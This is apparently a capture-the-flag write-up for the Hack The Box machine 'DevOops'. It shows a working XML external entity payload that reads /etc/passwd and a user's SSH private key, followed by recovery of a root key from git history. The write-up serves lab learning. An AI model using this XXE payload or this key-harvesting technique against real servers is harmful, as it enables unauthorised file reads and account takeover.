# DevOops

>skills this box involved:
- enumeration  
- git command use
- XXE file read
# USER
After carrying out our nmap scan we procede to the web browser to open up the http service and run a dirbuster scan on it
we can see that it comes back with two results.
```
/feed
/upload
```
Navigating to feed shows a static page and therefore nothing interesting however on the upload page there is a upload section where it allows us to upload xml files. We can now start creating a payload to get us code execution. We loads up burpSuite and intercept the request. The website mentions that we must have Author, Subject and Content tags in our xml so of course we add these.
```xml
<test>
  <Author>fieldraccoon</Author>
  <Subject>fieldraccoon</Subject>
  <Content>fieldraccoon</Content>
</test>
```
this is the data we add to our initial payload and we get a request back form the server.
```
PROCESSED BLOGPOST: 
  Author: fieldraccoon
 Subject: fieldraccoon
 Content: fieldraccoon
 URL for later reference: /uploads/exploit.xml
 File path: /home/roosa/deploy/src
 ```
 We see that there is a user called roosa in the file path. This is the user for this box. We now modify our payload to try and get code execution. This is the exploit:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>

<test>
  <Author>fieldraccoon</Author>
  <Subject>&file;</Subject>
  <Content>fieldraccoon</Content>
</test>
```
This reads the /etc/passwd file and confirms that the user roosa is the correct person we are after for this box.
We now try to grab the ssh key for the user by changing `file:///etc/passwd` to `file:///home/roosa/.ssh/id_rsa` This works perfectly and we read the ssh key. we copy this file to our box and ssh as roosa and read the user flag.

# ROOT
as we ssh we find that there is a git directory in /home/roosa/work/blogfeed/.git
we run `git log` to see if we find anything interesting and luckily we do.
```xml
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key
```
This means that the user had an old ssh key reverted(its the root ssh key) so we need to try and find a way to get this.
We run `git show 33e87c312c08735a02fa9c796021a4a3023129ad` and it shows us the root key,
We copy it to our box once again, give it appropriate permissions and ssh as root.

Please drop me some respecet if you found my writeup worth the read :)

<script src="https://www.hackthebox.eu/badge/246314"></script>

